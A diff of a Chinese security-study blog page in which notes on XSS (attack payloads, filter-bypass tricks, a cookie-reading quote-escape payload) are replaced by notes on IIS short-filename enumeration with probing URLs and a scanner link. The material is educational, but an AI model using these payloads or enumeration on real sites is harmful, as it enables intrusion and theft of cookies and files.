@@ -34,33 +34,16 @@
           </p>
           <div class="toc-container hidden lg:block">
             <ul class="markdownIt-TOC">
-<li><a href="#xss">XSS</a>
+<li>
 <ul>
-<li><a href="#%E6%A6%82%E8%BF%B0">概述</a></li>
-<li><a href="#%E5%88%86%E7%B1%BB">分类</a></li>
-<li><a href="#%E6%A3%80%E6%B5%8B">检测</a></li>
-<li><a href="#%E6%94%BB%E5%87%BB">攻击</a>
+<li><a href="#%E6%B5%8B%E8%AF%95%E7%8E%AF%E5%A2%83">测试环境</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0">漏洞成因</a></li>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8">漏洞利用</a>
 <ul>
-<li><a href="#%E5%8F%AF%E8%83%BD%E5%AD%98%E5%9C%A8xss%E7%9A%84%E5%9C%B0%E6%96%B9">可能存在XSS的地方</a>
-<ul>
-<li><a href="#html%E8%8A%82%E7%82%B9">HTML节点</a></li>
-<li><a href="#html%E5%B1%9E%E6%80%A7">HTML属性</a></li>
-<li><a href="#js%E4%BB%A3%E7%A0%81">JS代码</a></li>
-<li><a href="#%E5%AF%8C%E6%96%87%E6%9C%AC">富文本</a></li>
+<li><a href="#%E6%89%8B%E5%B7%A5">手工</a></li>
+<li><a href="#%E5%B7%A5%E5%85%B7">工具</a></li>
 </ul>
 </li>
-<li><a href="#bypass">ByPass</a>
-<ul>
-<li><a href="#%E6%A0%87%E7%AD%BE%E9%99%90%E5%88%B6">标签限制</a></li>
-<li><a href="#%E9%99%90%E5%88%B6%E5%8A%A8%E4%BD%9C">限制动作</a></li>
-<li><a href="#%E5%BC%95%E5%8F%B7%E9%80%83%E9%80%B8">引号逃逸</a></li>
-<li><a href="#%E9%95%BF%E5%BA%A6%E9%99%90%E5%88%B6">长度限制</a></li>
-</ul>
-</li>
-</ul>
-</li>
-<li><a href="#%E5%8D%B1%E5%AE%B3">危害</a></li>
-<li><a href="#%E9%9A%8F%E7%AC%94">随笔</a></li>
 </ul>
 </li>
 </ul>
@@ -109,130 +92,59 @@
 <div class="mask" onclick="closeMenu()">
 </div>
       <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
-        <h1 class="text-3xl font-bold lg:mt-16">XSS</h1>
+        <h1 class="text-3xl font-bold lg:mt-16">IIS短文件名泄露</h1>
         <div class="text-sm text-gray-700 lg:my-8">
-          2021-05-13 / 4 min read
+          2021-05-13 / 2 min read
         </div>
         
         <div class="post-content yue">
-          <h1 id="xss">XSS</h1>
-<h2 id="概述">概述</h2>
-<p>简单的说，攻击者构造的恶意脚本代码被浏览器运行了</p>
-<h2 id="分类">分类</h2>
-<ul>
-<li>
-<p>反射型</p>
-<p>一次性的，一般攻击者会诱骗用户点击某个链接，从而使页面运行嵌入的脚本</p>
-</li>
-<li>
-<p>存储型</p>
-<p>长时间的，构造的恶意代码被写入到了数据库，用户访问页面（正常页面）时会从数据库中调出该恶意代码，继而恶意代码执行</p>
-</li>
-<li>
-<p>DOM型</p>
-<p>基于⽂档对象模型DOM（Document Objeet Model），不经过后端，直接改变当前页面，其实可以归类到反射型中</p>
-</li>
-</ul>
-<h2 id="检测">检测</h2>
-<p>如果可以知道输出位置，试着输入特殊符号<code>&lt;&gt;()'&quot;</code>，查看HTML源代码是否被转义。如未被转义，可能存在漏洞</p>
-<p>如果无法知道输出位置，构造看起来正常的文本，从而骗过管理员（</p>
-<p>当然，扫描器也成。</p>
-<h2 id="攻击">攻击</h2>
-<h3 id="可能存在xss的地方">可能存在XSS的地方</h3>
-<h4 id="html节点">HTML节点</h4>
-<pre><code>&lt;div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;/p
+          <h2 id="测试环境">测试环境</h2>
+<p>windows server 2003 r2</p>
+<p>开启webdav服务和net服务。</p>
+<h2 id="漏洞成因">漏洞成因</h2>
+<p>为兼容16位的MS-DOS系统，windows会对较长的文件、目录生成短文件名</p>
+<p>查看段文件名</p>
+<pre><code>dir /x
 </code></pre>
-<p>payload</p>
-<pre><code>&lt;script&gt;alert(1);&lt;/script&gt;
+<p>在启用.net的IIS下暴力列举短文件名，原因是：</p>
+<p>（1）<strong>访问构造的某个存在的短文件名，会返回404</strong>；<br>
+（2）<strong>访问构造的某个不存在的短文件名，会返回400</strong>。</p>
+<p>漏洞的应用</p>
+<p>猜解物理路径、敏感文件，为后续的漏洞挖掘收集信息</p>
+<p>似乎好用，但有一定局限性</p>
+<h2 id="漏洞利用">漏洞利用</h2>
+<h3 id="手工">手工</h3>
+<pre><code>http://www.target.com/a*~1*/a.aspx
 </code></pre>
-<pre><code>&lt;svg/onload=alert()&gt;
+<pre><code>http://www.target.com/b*~1*/a.aspx
 </code></pre>
-<h4 id="html属性">HTML属性</h4>
-<pre><code>&lt;imgsrc=&quot;#{image}&quot;/&gt;
-&lt;inputvalue=&quot;#{text}&quot;/&gt;
+<p>……</p>
+<p>存在则返回404，否则返回400</p>
+<blockquote>
+<p>短文件名命名规则：前六位~1.三位后缀名</p>
+</blockquote>
+<p>需要猜解六位，假设猜解到如下情况</p>
+<pre><code>http://www.target.com/abcdef*~1*/a.aspx
 </code></pre>
-<p>payload</p>
-<pre><code>&lt;imgsrc=&quot;1&quot;onerror=&quot;alert(1)&quot;/&gt;
-&lt;inputvalue=&quot;1&quot;onclick=&quot;alert(1)&quot;/&gt;
-&lt;imgsrc=&quot;javascript:alert(1)&quot;/&gt;
-&quot;,',`
+<p>这时候需要判断这个是文件夹还是文件</p>
+<p>尝试下</p>
+<pre><code>http://www.target.com/abcdef*~1/a.aspx
 </code></pre>
-<h4 id="js代码">JS代码</h4>
-<pre><code>&lt;script&gt;
-vardata=&quot;#{data}&quot;;
-&lt;/script&gt;
+<p>如果返回404，说明是个文件夹，反之400，则是文件，继续后续猜解</p>
+<pre><code>http://www.target.com/abcdef*~1.a*/a.aspx
 </code></pre>
-<p>payload</p>
-<pre><code>hello&quot;;alert(1);&quot;
+<pre><code>http://www.target.com/abcdef*~1.b*/a.aspx
 </code></pre>
-<h4 id="富文本">富文本</h4>
-<p>=v=</p>
-<h3 id="bypass">ByPass</h3>
-<h4 id="标签限制">标签限制</h4>
-<p>限制了就用没限制的呗</p>
-<p>Body标签</p>
-<pre><code>&lt;bodyonpageshow=alert(1)&gt;
+<pre><code>http://www.target.com/abcdef*~1.c*/a.aspx
 </code></pre>
-<p>Style标签</p>
-<pre><code>&lt;styleonload=alert(1)/&gt;
+<p>……</p>
+<p>假设最后得到</p>
+<pre><code>http://www.target.com/abcdef*~1.zip/a.aspx
 </code></pre>
-<p>Marquee标签</p>
-<pre><code>&lt;marqueebehavior=&quot;alternate&quot;onstart=alert(1)&gt;hacktheplanet&lt;/marquee&gt;&lt;marqueeloop=&quot;1&quot;
-onfinish=alert(1)&gt;hacktheplanet&lt;/marquee&gt;&lt;marqueeonstart=alert(1)&gt;hacktheplanet&lt;/marquee&gt;
-</code></pre>
-<p>media标签</p>
-<pre><code>&lt;audiooncanplay=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
-&lt;audioondurationchange=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
-&lt;audioautoplay=trueonended=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
-&lt;audioonloadeddata=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
-&lt;audioonloadedmetadata=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
-&lt;audioonloadstart=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
-&lt;audioonprogress=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
-&lt;audioonsuspend=alert(1)src=&quot;/media/hack-the-planet.mp3&quot;/&gt;
-&lt;videooncanplay=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
-&lt;videoondurationchange=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
-&lt;videoautoplay=trueonended=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
-&lt;videoonloadeddata=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
-&lt;videoonloadedmetadata=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
-&lt;videoonloadstart=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
-&lt;videoonprogress=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
-&lt;videoonsuspend=alert(1)src=&quot;/media/hack-the-planet.mp4&quot;/&gt;
-</code></pre>
-<h4 id="限制动作">限制动作</h4>
-<pre><code>eval('~a~le~rt~~(~~1~~)~'.replace(/~/g,''))
-</code></pre>
-<pre><code>eval(/~a~le~rt~~(~~1~~)~/.source.replace(/~/g,newString()))
-</code></pre>
-<pre><code>varx=eval;x('alert(1)')
-</code></pre>
-<pre><code>varx=eval;x('alert(1)')
-</code></pre>
-<h4 id="引号逃逸">引号逃逸</h4>
-<pre><code>&lt;script&gt;
-varid=&quot;接收参数传进来的值&quot;;
-&lt;/script&gt;
-</code></pre>
-<p>payload</p>
-<pre><code>xss_attack&quot;%0aalert(document.cookie)%0a&quot;
-</code></pre>
-<p>XSS利用编码绕过参考文章</p>
-<p>https://blog.csdn.net/qq_37133717/article/details/94651840</p>
-<p>https://blog.csdn.net/Fly_hps/article/details/82944455</p>
-<h4 id="长度限制">长度限制</h4>
-<p>使用特殊符号一个顶俩、使用别的标签</p>
-<pre><code>&lt;script/src=//⑭.₨&gt;
-</code></pre>
-<p>https://www.freebuf.com/column/220970.html</p>
-<h2 id="危害">危害</h2>
-<p>盗取cookie</p>
-<p>修改网页内容</p>
-<p>挂马</p>
-<p>重定向（引流、跳转别的危险页面</p>
-<p>XSS蠕虫</p>
-<h2 id="随笔">随笔</h2>
-<p>后期按时更新（两天一更），顺便帮助自己复习</p>
-<p>学一点有一点的欢喜！</p>
+<p>猜解基本就到这了，我们暂时无法得知中间星号隐藏掉的信息。</p>
+<p>但是，我们可以按照这个思路继续猜，或许能猜出完整的文件名</p>
+<h3 id="工具">工具</h3>
+<p>https://github.com/lijiejie/IIS_shortname_Scanner</p>
 
         </div>
 
@@ -241,21 +153,12 @@ varid=&quot;接收参数传进来的值&quot;;
 
         <div class="flex justify-between py-8">
           
-            <div class="prev-post">
-              <a href="https://Morn-zh.github.io/post/xin-xi-shou-ji-zhi-min-gan-lu-jing/">
-                <h3 class="post-title">
-                  <i class="ri-arrow-left-line"></i>
-                  信息收集之敏感路径
-                </h3>
-              </a>
-            </div>
-          
 
           
             <div class="next-post">
-              <a href="https://Morn-zh.github.io/post/wo-yan-zhong-de-hong-dui-zhuan-zai/">
+              <a href="https://Morn-zh.github.io/post/xin-xi-shou-ji-zhi-min-gan-lu-jing/">
                 <h3 class="post-title">
-                  我眼中的红队（转载）
+                  信息收集之敏感路径
                   <i class="ri-arrow-right-line"></i>
                 </h3>
               </a>
